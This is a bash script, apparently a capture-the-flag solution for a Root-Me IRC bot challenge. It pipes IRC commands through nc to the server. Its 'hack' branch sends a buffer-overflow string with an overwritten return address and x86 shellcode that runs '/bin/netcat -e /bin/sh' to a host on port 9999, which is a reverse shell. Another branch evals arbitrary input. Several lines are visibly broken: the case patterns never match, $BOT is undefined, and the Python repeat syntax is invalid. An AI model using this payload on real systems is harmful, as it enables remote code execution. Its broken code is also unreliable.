#!/bin/bash

(( $# == 2 )) || { echo >&2 "Usage: $0 NICK USER"; exit 1; }

NICK=$1
USER=$2
SERVER=irc.root-me.org
PORT=6667
CHAN="#root-me_challenge"

{
        # join channel and say hi
        cat <<-EOF
                NICK $NICK
                USER $USER 8 x : $USER
EOF
        sleep 2
        echo "JOIN $CHAN"

        # forward messages from STDIN to the chan, indefinitely
		while read LINE
		do
				case "$LINE" in
				bot)
						CMD=$(echo $LINE | cut -d' ' -f2)
						MSG=$(echo $LINE | cut -d' ' -f3-)
						echo "$CMD $BOT : $MSG"
						;;
				chan)
						echo "$LINE" | sed "s/^chan /PRIVMSG $CHAN :/"
						;;
				user)
						echo "$LINE" | sed 's/^user /PRIVMSG /'
						;;
				cmd)
						CMD=$(echo "$LINE" | sed 's/^cmd //')
						echo "PRIVMSG $BOT :$(eval $CMD)"
						;;
				hack)
						# Override Handle_List on JOIN
						echo "PRIVMSG $BOT :"$(python -c 'print "!" + "A"(63+40+36) + "\x08\x04\xb1\x20"[::-1]')
						# Write shellcode to buff and override JOIN so it can be matched again
						echo "PRIVMSG $BOT :"$(python -c 'print "!" + "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46" + "A"2 + "JOIN" + "\x00"')

						# Execute JOIN
						echo "JOIN $BOT :"
						;;
				esac
	done

} | nc $SERVER $PORT
